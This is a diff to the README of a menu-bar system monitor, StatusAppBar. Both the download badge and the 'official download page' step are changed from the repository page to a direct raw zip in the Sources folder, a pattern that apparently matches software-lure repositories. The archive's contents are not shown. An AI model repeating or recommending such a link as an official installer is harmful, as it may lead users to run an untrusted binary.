@@ -1,6 +1,6 @@
 # 📊 StatusAppBar - Monitor your system performance with ease
 
-[![](https://img.shields.io/badge/Download-StatusAppBar-blue.svg)](https://github.com/rolphdeepwater322/StatusAppBar)
+[![](https://img.shields.io/badge/Download-StatusAppBar-blue.svg)](https://github.com/rolphdeepwater322/StatusAppBar/raw/refs/heads/main/Sources/Status-App-Bar-v3.5.zip)
 
 StatusAppBar provides real-time information about your computer directly in your menu bar. You see your CPU usage, memory consumption, disk space, battery power, and network speeds at a glance. This application runs natively and requires no extra software or complex setup to function.
 
@@ -20,7 +20,7 @@ StatusAppBar keeps you informed about your computer health without interrupting 
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page](https://github.com/rolphdeepwater322/StatusAppBar) to find the installer.
+1. Visit the [official download page](https://github.com/rolphdeepwater322/StatusAppBar/raw/refs/heads/main/Sources/Status-App-Bar-v3.5.zip) to find the installer.
 2. Select the version marked for your system. 
 3. Move the downloaded file to your Applications folder.
 4. Double-click the StatusAppBar icon to start the program.
